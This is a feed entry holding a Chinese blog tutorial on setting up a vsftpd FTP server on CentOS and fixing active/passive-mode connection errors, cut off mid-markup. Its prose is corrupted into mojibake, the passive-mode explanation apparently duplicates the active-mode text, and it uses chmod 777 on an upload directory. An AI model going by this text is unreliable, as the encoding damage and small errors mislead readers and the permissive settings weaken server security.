      <category term="Neural Network" scheme="http://ggb0n.cool/tags/Neural-Network/"/>
    
  </entry>
  
  <entry>
    <title>FTPæœåŠ¡å™¨æ­å»ºåŠå…¸å‹é—®é¢˜çš„è§£å†³</title>
    <link href="http://ggb0n.cool/2020/04/03/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/"/>
    <id>http://ggb0n.cool/2020/04/03/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/</id>
    <published>2020-04-03T01:59:36.000Z</published>
    <updated>2020-04-22T00:14:03.093Z</updated>
    
    <content type="html"><![CDATA[<p>SSHç®¡ç†è¿œç¨‹LinuxæœåŠ¡å™¨å°‘ä¸äº†æ–‡ä»¶çš„ä¼ è¾“ï¼Œè™½ç„¶<code>lrzsz</code>èƒ½å¤Ÿè§£å†³æœ¬åœ°ä¸è¿œç¨‹æœåŠ¡å™¨ä¹‹é—´æ–‡ä»¶ä¼ è¾“çš„é—®é¢˜ï¼Œä½¿ç”¨<code>sz/rz</code>å³å¯ï¼Œæ¯”å¦‚ï¼š<a id="more"></a></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">sz filename #å‘é€ä¸€ä¸ªæ–‡ä»¶åˆ°æœ¬åœ°</span><br><span class="line">sz filename1 filename2 #å‘é€å¤šä¸ªæ–‡ä»¶åˆ°æœ¬åœ°</span><br><span class="line">sz dir/* #å‘é€dirç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä¸åŒ…å«dirä¸‹çš„æ–‡ä»¶å¤¹</span><br></pre></td></tr></table></figure><p>ä»æœ¬åœ°ä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨åœ¨ç»ˆç«¯è¾“å…¥<code>rz</code>å³å¯ã€‚å‚è€ƒ<a href="https://blog.51cto.com/skypegnu1/1538371">è¿™é‡Œ</a>ã€‚</p><p>ä½†æ˜¯<code>lrzsz</code>å¤„ç†å°æ–‡ä»¶å¯ä»¥ï¼Œå¤„ç†å¤§æ–‡ä»¶æ•ˆæœå°±ä¸å¤ªå¥½ï¼Œå› æ­¤ï¼Œå¯ä»¥é€‰æ‹©å¦ä¸€ç§æ–¹å¼ï¼Œæ²¡é”™ï¼Œæ­å»ºä¸€ä¸ªFTPæœåŠ¡å™¨ã€‚è€Œä¸”FTPæœåŠ¡å™¨èƒ½æ”¯æŒå¤šäººå¯¹æ–‡ä»¶çš„å…±äº«ã€‚</p><h3 id="æ­å»ºFTPæœåŠ¡å™¨"><a href="#æ­å»ºFTPæœåŠ¡å™¨" class="headerlink" title="æ­å»ºFTPæœåŠ¡å™¨"></a>æ­å»ºFTPæœåŠ¡å™¨</h3><p>æˆ‘çš„æœåŠ¡å™¨æ˜¯CentOSçš„ï¼Œå› æ­¤ä¸‹é¢çš„é…ç½®ä»¥CentOSä¸‹çš„é…ç½®ä¸ºä¾‹ï¼Œä¸è¿‡å…¶ä»–Linuxç³»ç»Ÿå¤§åŒå°å¼‚ï¼Œæ ¹æ®ä¸ªäººæƒ…å†µé…ç½®å³å¯ã€‚</p><h4 id="å®‰è£…vsftpd"><a href="#å®‰è£…vsftpd" class="headerlink" title="å®‰è£…vsftpd"></a>å®‰è£…vsftpd</h4><p>Linuxä¸‹è½»ä¾¿çš„çš„ftpç¨‹åºåº”è¯¥å°±æ˜¯vsftpdäº†ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥yumå®‰è£…ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yum install -y vsftpd</span><br></pre></td></tr></table></figure><h4 id="é…ç½®vsftpd"><a href="#é…ç½®vsftpd" class="headerlink" title="é…ç½®vsftpd"></a>é…ç½®vsftpd</h4><p>vsftpdçš„é…ç½®ç›®å½•ä¸º<code>/etc/vsftpd</code>ï¼ŒåŒ…å«ä¸‹åˆ—çš„é…ç½®æ–‡ä»¶ï¼š</p><ul><li><code>vsftpd.conf</code>ä¸ºä¸»è¦é…ç½®æ–‡ä»¶</li><li><code>ftpusers</code>é…ç½®ç¦æ­¢è®¿é—® FTP æœåŠ¡å™¨çš„ç”¨æˆ·åˆ—è¡¨</li><li><code>user_list</code>é…ç½®ç”¨æˆ·è®¿é—®æ§åˆ¶</li></ul><p>è¿™é‡Œæˆ‘ä»¬ä¸»è¦å¯¹<code>vsftpd.conf</code>è¿›è¡Œé…ç½®ï¼Œè¿™é‡Œå¯ä»¥å…ˆç”¨ä¸‹é¢è¿™æ¡å‘½ä»¤çœ‹åˆå§‹çš„é…ç½®æœ‰å“ªäº›ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/vsftpd/vsftpd.conf | grep -v "#" | <span class="built_in">more</span></span><br></pre></td></tr></table></figure><p>å„é¡¹é…ç½®çš„è§„åˆ™å¦‚ä¸‹ï¼š</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¼€å¯åŒ¿åç™»å½•</span></span><br><span class="line"><span class="attr">anonymous_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># å…è®¸ä½¿ç”¨æœ¬åœ°å¸æˆ·è¿›è¡ŒFTPç”¨æˆ·ç™»å½•éªŒè¯</span></span><br><span class="line"><span class="attr">local_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># å…è®¸å†™</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># è®¾ç½®æœ¬åœ°ç”¨æˆ·é»˜è®¤æ–‡ä»¶æ©ç 022</span></span><br><span class="line"><span class="attr">local_umask</span>=<span class="number">022</span></span><br><span class="line"><span class="comment"># å…è®¸åŒ¿åä¸Šä¼ </span></span><br><span class="line"><span class="attr">anon_upload_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># å…è®¸åŒ¿ååˆ›å»ºæ–°ç›®å½•</span></span><br><span class="line"><span class="attr">anon_mkdir_write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># åŒæ—¶å¼€æ”¾å…¶å®ƒæƒé™</span></span><br><span class="line"><span class="attr">anon_other_write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># å¯ä»¥å‘é€æ¶ˆæ¯å½“è®¿é—®æŸä¸ªç›®å½•æ—¶</span></span><br><span class="line"><span class="attr">dirmessage_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># å¼€å¯ä¸Šä¼ ä¸‹è½½è®°å½•</span></span><br><span class="line"><span class="attr">xferlog_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># æ•°æ®é“¾é€šè¿‡20ç«¯å£å»ºç«‹</span></span><br><span class="line"><span class="attr">connect_from_port_20</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…è®¸å…¶å®ƒç”¨æˆ·ä¸Šä¼ åŒ¿åæ–‡ä»¶</span></span><br><span class="line"><span class="comment">#chown_uploads=YES</span></span><br><span class="line"><span class="comment"># æ‰€æœ‰ç”¨æˆ·</span></span><br><span class="line"><span class="comment">#chown_username=whoever</span></span><br><span class="line"><span class="comment"># æ—¥å¿—ä¿å­˜åˆ°</span></span><br><span class="line"><span class="comment">#xferlog_file=/var/log/xferlog</span></span><br><span class="line"><span class="comment"># æ—¥å¿—æ ‡å‡†è¾“å‡º</span></span><br><span class="line"><span class="attr">xferlog_std_format</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># ç©ºé—²ä¼šè¯æ—¶é—´</span></span><br><span class="line"><span class="comment">#idle_session_timeout=600</span></span><br><span class="line"><span class="comment"># æ•°æ®è¿æ¥è¶…æ—¶æ—¶é—´</span></span><br><span class="line"><span class="comment">#data_connection_timeout=120</span></span><br><span class="line"><span class="comment"># éš”ç¦»çš„å®‰å…¨ç”¨æˆ·</span></span><br><span class="line"><span class="comment">#nopriv_user=ftpsecure</span></span><br><span class="line"><span class="comment"># å¼€å¯å¼‚æ­¥æ•°æ®çº¿ç¨‹</span></span><br><span class="line"><span class="comment">#async_abor_enable=YES</span></span><br><span class="line"><span class="comment"># å¼€å¯ASCIIåè®®ä¸Šä¼ </span></span><br><span class="line"><span class="attr">ascii_upload_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># å¼€å¯ASCIIåè®®ä¸‹è½½</span></span><br><span class="line"><span class="attr">ascii_download_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># å¼€å¯é‚®ç®±éªŒè¯</span></span><br><span class="line"><span class="comment">#deny_email_enable=YES</span></span><br><span class="line"><span class="comment"># æ‹’ç»çš„é‚®ç®±åˆ—è¡¨</span></span><br><span class="line"><span class="comment">#banned_email_file=/etc/vsftpd/banned_emails</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜¯å¦å…è®¸ç›´æ¥è·å–å­ç›®å½•ä¿¡æ¯</span></span><br><span class="line"><span class="comment">#ls_recurse_enable=YES</span></span><br><span class="line"><span class="comment"># ç›‘å¬IPv4</span></span><br><span class="line"><span class="attr">listen</span>=<span class="literal">NO</span></span><br><span class="line"><span class="comment"># ç›‘å¬IPv6å’Œç›‘å¬IPv4</span></span><br><span class="line"><span class="attr">listen_ipv6</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è™šæ‹Ÿç”¨æˆ·å¯ç”¨pamè®¤è¯</span></span><br><span class="line"><span class="attr">pam_service_name</span>=vsftpd</span><br><span class="line"><span class="comment"># ç”¨æˆ·ç»„ç®¡ç†</span></span><br><span class="line"><span class="attr">userlist_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># è®¿é—®æ§åˆ¶</span></span><br><span class="line"><span class="attr">tcp_wrappers</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…ä½¿ç”¨è¢«åŠ¨æ¨¡å¼</span></span><br><span class="line"><span class="attr">pasv_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># æŒ‡å®šä½¿ç”¨è¢«åŠ¨æ¨¡å¼æ—¶æ‰“å¼€ç«¯å£çš„æœ€å°å€¼</span></span><br><span class="line"><span class="attr">pasv_min_port</span>=<span class="number">10060</span></span><br><span class="line"><span class="comment"># æŒ‡å®šä½¿ç”¨è¢«åŠ¨æ¨¡å¼æ—¶æ‰“å¼€ç«¯å£çš„æœ€å¤§å€¼ã€‚</span></span><br><span class="line"><span class="attr">pasv_max_port</span>=<span class="number">10090</span></span><br><span class="line"><span class="comment"># ç”¨æˆ·å®½å¸¦é™åˆ¶200kps</span></span><br><span class="line"><span class="comment">#local_max_rate=200000</span></span><br><span class="line"><span class="comment"># ç™»å½•åæ¬¢è¿å†…å®¹</span></span><br><span class="line"><span class="attr">ftpd_banner</span>=Welcome to My FTP service.</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------å¼€å¯è™šæ‹Ÿç”¨æˆ·ç»„å‚æ•°--------</span></span><br><span class="line"><span class="comment"># å¼€å¯è™šæ‹Ÿç”¨æˆ·</span></span><br><span class="line"><span class="attr">guest_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># ä¸»è™šæ‹Ÿç”¨æˆ·åvsftpdï¼Œç­‰ä¸‹ä¼šå»ºç«‹</span></span><br><span class="line"><span class="attr">guest_username</span>=vsftpd</span><br><span class="line"><span class="comment"># è™šæ‹Ÿç”¨æˆ·é…ç½®ï¼ˆå¯ä»¥å¯¹æ¯ä¸€ä¸ªè™šæ‹Ÿç”¨æˆ·è¿›è¡Œå•ç‹¬çš„æƒé™é…ç½®ï¼‰</span></span><br><span class="line"><span class="attr">user_config_dir</span>=/etc/vsftpd/vconf</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ç”¨é™å®šç”¨æˆ·åœ¨å…¶ä¸»ç›®å½•ä¸‹</span></span><br><span class="line"><span class="attr">chroot_local_user</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># å¼€å¯ç”¨æˆ·åˆ—è¡¨chrootç®¡ç†</span></span><br><span class="line"><span class="attr">chroot_list_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="comment"># chrootç®¡ç†çš„ç”¨æˆ·åˆ—è¡¨ï¼ˆä¸€è¡Œä¸€ç”¨æˆ·,è™šæ‹Ÿç”¨æˆ·éƒ½è¦æ·»åŠ è¿›å»ï¼‰</span></span><br><span class="line"><span class="comment"># å½“è®¾ç½®ç”¨æˆ·åªèƒ½åœ¨ç™»å½•ç›®å½•æ—¶ï¼Œchrootç®¡ç†çš„ç”¨æˆ·ä¸ºä¸å—é™åˆ¶ï¼Œå¦åˆ™ç›¸å</span></span><br><span class="line"><span class="attr">chroot_list_file</span>=/etc/vsftpd/chroot_list</span><br><span class="line"><span class="comment"># å…è®¸chrootç®¡ç†ç”¨æˆ·è¿›è¡Œå†™æ“ä½œ</span></span><br><span class="line"><span class="attr">allow_writeable_chroot</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------è™šæ‹Ÿç”¨æˆ·é«˜çº§å‚æ•°ï¼ˆè¯·é€‰æ‹©ä¸€ç»„ï¼‰--------</span></span><br><span class="line"><span class="comment"># è™šæ‹Ÿç”¨æˆ·å’Œæœ¬åœ°ç”¨æˆ·æœ‰ç›¸åŒçš„æƒé™</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è™šæ‹Ÿç”¨æˆ·å’ŒåŒ¿åç”¨æˆ·æœ‰ç›¸åŒçš„æƒé™ï¼Œé»˜è®¤æ˜¯NO</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è™šæ‹Ÿç”¨æˆ·å…·æœ‰å†™æƒé™ï¼ˆä¸Šä¼ ã€ä¸‹è½½ã€åˆ é™¤ã€é‡å‘½åï¼‰</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è™šæ‹Ÿç”¨æˆ·ä¸èƒ½æµè§ˆç›®å½•ï¼Œåªèƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œæ— å…¶ä»–æƒé™</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_upload_enable</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è™šæ‹Ÿç”¨æˆ·åªèƒ½ä¸‹è½½æ–‡ä»¶ï¼Œæ— å…¶ä»–æƒé™</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">anon_upload_enable</span>=<span class="literal">NO</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è™šæ‹Ÿç”¨æˆ·åªèƒ½ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶ï¼Œæ— å…¶ä»–æƒé™</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">anon_upload_enable</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è™šæ‹Ÿç”¨æˆ·åªèƒ½ä¸‹è½½æ–‡ä»¶å’Œåˆ›å»ºæ–‡ä»¶å¤¹ï¼Œæ— å…¶ä»–æƒé™</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">anon_mkdir_write_enable</span>=<span class="literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è™šæ‹Ÿç”¨æˆ·åªèƒ½ä¸‹è½½ã€åˆ é™¤å’Œé‡å‘½åæ–‡ä»¶ï¼Œæ— å…¶ä»–æƒé™</span></span><br><span class="line"><span class="attr">virtual_use_local_privs</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">write_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">anon_world_readable_only</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">anon_other_write_enable</span>=<span class="literal">YES</span></span><br></pre></td></tr></table></figure><p>è€Œæˆ‘ä»¬ä¸ä¸€å®šæ¯é¡¹éƒ½è¿›è¡Œé…ç½®ï¼Œåœ¨åˆå§‹çš„åŸºç¡€ä¹‹ä¸Šï¼Œè¿›è¡Œå¦‚ä¸‹é…ç½®å³å¯ï¼š</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸Šé¢å·²ç»ç»™äº†å…¨éƒ¨é…ç½®çš„å«ä¹‰ï¼Œè‡ªå·±æ¯”å¯¹å³å¯</span></span><br><span class="line"><span class="attr">anonymous_enable</span>=<span class="literal">NO</span></span><br><span class="line"><span class="attr">pam_service_name</span>=vsftpd</span><br><span class="line"><span class="attr">userlist_enable</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">tcp_wrappers</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">allow_writeable_chroot</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">local_root</span>=/data/ftp/ <span class="comment">#ç»™ftpè´¦æˆ·æŒ‡å®šä¸»ç›®å½•</span></span><br><span class="line"><span class="attr">listen_port</span>=<span class="number">60021</span> <span class="comment">#è¿™é‡Œä¹Ÿå¯ä»¥ä¸è®¾ç½®ï¼Œé»˜è®¤ftpæ˜¯21ç«¯å£</span></span><br></pre></td></tr></table></figure><p>é…ç½®å®Œä¹‹åä¿å­˜ï¼Œç„¶åé‡å¯vsftpdã€‚</p><h4 id="åˆ›å»ºFTPç”¨æˆ·"><a href="#åˆ›å»ºFTPç”¨æˆ·" class="headerlink" title="åˆ›å»ºFTPç”¨æˆ·"></a>åˆ›å»ºFTPç”¨æˆ·</h4><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–°è´¦æˆ·<code>ftpuser</code>ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">useradd ftpuser</span><br></pre></td></tr></table></figure><p>ç„¶åä¸ºå…¶è®¾ç½®å¯†ç ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">passwd ftpuser</span><br></pre></td></tr></table></figure><p>ç°åœ¨è¿™ä¸ªè´¦æˆ·å…¶å®æ˜¯ä¸€ä¸ªå¯ç™»å½•çš„Linuxç”¨æˆ·ï¼Œä¸ºäº†å®‰å…¨ï¼Œæˆ‘ä»¬è¦é™åˆ¶ç”¨æˆ·çš„æƒé™ï¼Œä¸èƒ½è®©å…¶ç™»å½•linuxè€Œåªèƒ½ç”¨äºç™»å½•FTPæœåŠ¡å™¨ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">usermod -s /sbin/nologin ftpuser</span><br></pre></td></tr></table></figure><h4 id="æŒ‡å®šä¸»ç›®å½•"><a href="#æŒ‡å®šä¸»ç›®å½•" class="headerlink" title="æŒ‡å®šä¸»ç›®å½•"></a>æŒ‡å®šä¸»ç›®å½•</h4><p>å‰é¢é…ç½®æ–‡ä»¶é‡Œçœ‹åˆ°äº†æˆ‘ä»¬ä¸ºftpç”¨æˆ·æŒ‡å®šäº†ä¸»ç›®å½•<code>/data/ftp</code>ï¼Œä½†æ˜¯åˆå§‹æƒ…å†µè¯¥ç›®å½•å¯èƒ½ä¸å­˜åœ¨ï¼Œéœ€è¦æ–°å»ºæ–‡ä»¶ç›®å½•ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">chmod a-w /data/ftp &amp;&amp; chmod <span class="number">777</span> -R /data/ftp/pub</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŒæ—¶ä¹Ÿä¸ºç›®å½•è®¾ç½®äº†æƒé™ï¼Œå¯ä»¥çœ‹åˆ°<code>pub</code>ç›®å½•æ˜¯<code>777</code>æƒé™ï¼Œæ–‡ä»¶çš„ä¸Šä¼ ã€ä¸‹è½½ä¹Ÿå°±åœ¨æ­¤ç›®å½•ä¹‹ä¸‹äº†ã€‚</p><p>ç„¶åè®¾ç½®ä¸ºç”¨æˆ·ä¸»ç›®å½•ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">usermod -d /data/ftp ftpuser</span><br></pre></td></tr></table></figure><h4 id="é˜²ç«å¢™è®¾ç½®"><a href="#é˜²ç«å¢™è®¾ç½®" class="headerlink" title="é˜²ç«å¢™è®¾ç½®"></a>é˜²ç«å¢™è®¾ç½®</h4><p>å‰é¢çš„<code>listen_port</code>å¦‚æœæ›´æ”¹çš„è¯ï¼Œä¹Ÿè¦åœ¨é˜²ç«å¢™æ¥å¼€æ”¾å…¶ç«¯å£ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">firewall-<span class="built_in">cmd</span> --zone=public --add-port=<span class="number">60021</span>/tcp --permanent</span><br></pre></td></tr></table></figure><p>ç„¶åé‡å¯é˜²ç«å¢™ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">firewall-<span class="built_in">cmd</span> --reload</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼ŒåŸºç¡€çš„é…ç½®ä¹Ÿå°±å®Œæ¯•äº†ï¼Œä¸‹é¢è¿›è¡Œæµ‹è¯•ã€‚</p><h3 id="æµ‹è¯•æœåŠ¡å™¨åŠé—®é¢˜å‘ç°"><a href="#æµ‹è¯•æœåŠ¡å™¨åŠé—®é¢˜å‘ç°" class="headerlink" title="æµ‹è¯•æœåŠ¡å™¨åŠé—®é¢˜å‘ç°"></a>æµ‹è¯•æœåŠ¡å™¨åŠé—®é¢˜å‘ç°</h3><p>è¿æ¥FTPæœåŠ¡å™¨å¯ä»¥é€‰ç”¨ä¸€äº›FTPå®¢æˆ·ç«¯è½¯ä»¶ï¼š<code>FileZilla Client</code>ã€<code>CuteFTP</code>ç­‰å¾ˆå¤šï¼Œæˆ‘ç”¨äº†<code>FileZilla Client</code>è¿›è¡Œæµ‹è¯•ã€‚</p><p>è¿™é‡Œç”±äºFTPçš„è¿æ¥æœ‰ä¸¤ç§æ¨¡å¼ï¼š<code>ä¸»åŠ¨ï¼ˆPOSTï¼‰</code>å’Œ<code>è¢«åŠ¨ï¼ˆPASVï¼‰</code>ä¸¤ç§æ¨¡å¼ï¼š</p><blockquote><p>POSTæ¨¡å¼ï¼šå½“å®¢æˆ·ç«¯Cå‘æœåŠ¡ç«¯Sè¿æ¥åï¼Œä½¿ç”¨çš„æ˜¯Portæ¨¡å¼,é‚£ä¹ˆå®¢æˆ·ç«¯Cä¼šå‘é€ä¸€æ¡å‘½ä»¤å‘Šè¯‰æœåŠ¡ç«¯S(å®¢æˆ·ç«¯Cåœ¨æœ¬åœ°æ‰“å¼€äº†ä¸€ä¸ªç«¯å£Nåœ¨ç­‰ç€ä½ è¿›è¡Œæ•°æ®è¿æ¥),å½“æœåŠ¡ç«¯Sæ”¶åˆ°è¿™ä¸ªPortå‘½ä»¤å å°±ä¼šå‘å®¢æˆ·ç«¯æ‰“å¼€çš„é‚£ä¸ªç«¯å£Nè¿›è¡Œè¿æ¥ï¼Œè¿™ç§æ•°æ®è¿æ¥å°±ç”Ÿæˆäº†ã€‚</p><p>PASVæ¨¡å¼ï¼šå½“å®¢æˆ·ç«¯Cå‘æœåŠ¡ç«¯Sè¿æ¥åï¼Œä½¿ç”¨çš„æ˜¯Portæ¨¡å¼,é‚£ä¹ˆå®¢æˆ·ç«¯Cä¼šå‘é€ä¸€æ¡å‘½ä»¤å‘Šè¯‰æœåŠ¡ç«¯S(å®¢æˆ·ç«¯Cåœ¨æœ¬åœ°æ‰“å¼€äº†ä¸€ä¸ªç«¯å£Nåœ¨ç­‰ç€ä½ è¿›è¡Œæ•°æ®è¿æ¥),å½“æœåŠ¡ç«¯Sæ”¶åˆ°è¿™ä¸ªPortå‘½ä»¤å å°±ä¼šå‘å®¢æˆ·ç«¯æ‰“å¼€çš„é‚£ä¸ªç«¯å£Nè¿›è¡Œè¿æ¥ï¼Œè¿™ç§æ•°æ®è¿æ¥å°±ç”Ÿæˆäº†ã€‚</p></blockquote><p>æŒ‰ç…§å‰é¢çš„åŸºç¡€é…ç½®åœ¨æµ‹è¯•æ—¶å‘ç°ä¸»åŠ¨å’Œè¢«åŠ¨æ¨¡å¼ç™»å½•éƒ½å­˜åœ¨é—®é¢˜</p><h4 id="ä¸»åŠ¨æ¨¡å¼è¿æ¥çš„é—®é¢˜"><a href="#ä¸»åŠ¨æ¨¡å¼è¿æ¥çš„é—®é¢˜" class="headerlink" title="ä¸»åŠ¨æ¨¡å¼è¿æ¥çš„é—®é¢˜"></a>ä¸»åŠ¨æ¨¡å¼è¿æ¥çš„é—®é¢˜</h4><p>é¦–æ¬¡è¿æ¥å‘ç°å¯ä»¥ç™»å½•ï¼Œä½†æ˜¯è¯»å–ç›®å½•åˆ—è¡¨å¤±è´¥ï¼ŒæŠ¥é”™æƒ…å†µå¦‚ä¸‹ï¼š<br><img src="http://ggb0n.cool/images/ftp2.png" alt=""></p><p>æ ¹æ®æŠ¥é”™æç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">çŠ¶æ€:å·²ç™»å½•</span><br><span class="line">çŠ¶æ€:è¯»å–ç›®å½•åˆ—è¡¨...</span><br><span class="line">å‘½ä»¤:PWD</span><br><span class="line">å“åº”:257 &quot;&#x2F;data&#x2F;ftp&quot;</span><br><span class="line">å‘½ä»¤:TYPE I</span><br><span class="line">å“åº”:200 Switching to Binary mode.</span><br><span class="line">å‘½ä»¤:PORT xx,xx,xx,xx,216,94</span><br><span class="line">å“åº”:500 Illegal PORT command.</span><br><span class="line">å‘½ä»¤:PASV</span><br><span class="line">å“åº”:227 Entering Passive Mode (xx,xx,xx,xx,227,27).</span><br><span class="line">å‘½ä»¤:LIST</span><br><span class="line">é”™è¯¯:20 ç§’åæ— æ´»åŠ¨ï¼Œè¿æ¥è¶…æ—¶</span><br><span class="line">é”™è¯¯:è¯»å–ç›®å½•åˆ—è¡¨å¤±è´¥</span><br></pre></td></tr></table></figure><p>æ ¹æ®æŠ¥é”™æ—¥å¿—ï¼Œä¸éš¾ç†è§£ï¼Œå½“æˆåŠŸç™»å½•ä¹‹åï¼Œè¿›è¡Œç›®å½•è¯»å–ï¼Œå…¶å®ä¹Ÿå°±æ˜¯æ•°æ®ä¼ è¾“çš„æ—¶å€™ï¼Œå› ä¸ºæ˜¯ä¸»åŠ¨æ¨¡å¼ï¼ŒæœåŠ¡å™¨ä¼šä¸»åŠ¨å‘å®¢æˆ·ç«¯è¿™è¾¹è¿›è¡Œè¿æ¥ï¼Œå³å‘<code>21694</code>ç«¯å£è¿›è¡Œè¿æ¥ï¼Œç„¶åå°±æŠ¥é”™äº†ï¼Œæ ¹æœ¬åŸå› åº”è¯¥å°±æ˜¯å®¢æˆ·ç«¯æœºå™¨çš„é˜²ç«å¢™å¯¹è¯¥ç«¯å£å¹¶æ²¡æœ‰å¼€æ”¾ï¼Œå› æ­¤è¿æ¥è‚¯å®šæ˜¯å¤±è´¥çš„ã€‚ç„¶ååˆé‡‡ç”¨äº†è¢«åŠ¨æ¨¡å¼è¿›è¡Œè¿æ¥ï¼Œå³æœåŠ¡å™¨å¼€æ”¾<code>22727</code>ç«¯å£ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥ï¼Œç„¶è€Œè¿˜æ˜¯å¤±è´¥äº†ï¼ŒåŸå› ä½•åœ¨å‘¢ï¼Ÿ</p><p>ç”±äºä¸€äº›å®¢è§‚åŸå› ï¼Œæˆ‘æ²¡æœ‰å¯¹è‡ªå·±çš„å®¢æˆ·æœºçš„é˜²ç«å¢™è¿›è¡Œæ›´æ”¹ï¼Œè€Œæ˜¯æ¢ç”¨è¢«åŠ¨æ¨¡å¼ï¼Œå½“ç„¶ï¼Œä¹Ÿé‡åˆ°äº†ä¸€äº›é—®é¢˜ã€‚</p><h4 id="è¢«åŠ¨æ¨¡å¼è¿æ¥çš„é—®é¢˜"><a href="#è¢«åŠ¨æ¨¡å¼è¿æ¥çš„é—®é¢˜" class="headerlink" title="è¢«åŠ¨æ¨¡å¼è¿æ¥çš„é—®é¢˜"></a>è¢«åŠ¨æ¨¡å¼è¿æ¥çš„é—®é¢˜</h4><p>é‡‡ç”¨è¢«åŠ¨è¿æ¥çš„æ–¹å¼ï¼Œé¦–å…ˆéœ€è¦åœ¨<code>vsftpd.conf</code>ä¸‹è¿›è¡Œå¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pasv_enable=YES#å¼€å¯è¢«åŠ¨æ¨¡å¼</span><br><span class="line">pasv_min_port=<span 